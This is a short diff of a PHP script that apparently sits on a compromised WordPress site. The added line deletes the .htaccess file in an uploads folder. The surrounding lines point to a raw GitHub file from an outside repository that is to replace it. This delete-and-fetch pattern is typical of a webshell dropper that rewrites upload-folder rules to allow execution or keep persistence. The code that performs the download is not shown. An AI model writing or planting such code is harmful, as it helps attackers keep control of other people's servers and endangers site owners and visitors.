@@ -1,5 +1,6 @@
 <?php
 
+unlink("/var/www/new_uinsa/wp-content/uploads/2022/07/.htaccess");
 $url = "https://raw.githubusercontent.com/69dev-id/hc/refs/heads/main/.htaccess";
 $destination = "/var/www/new_uinsa/wp-content/uploads/2022/07/.htaccess";
 
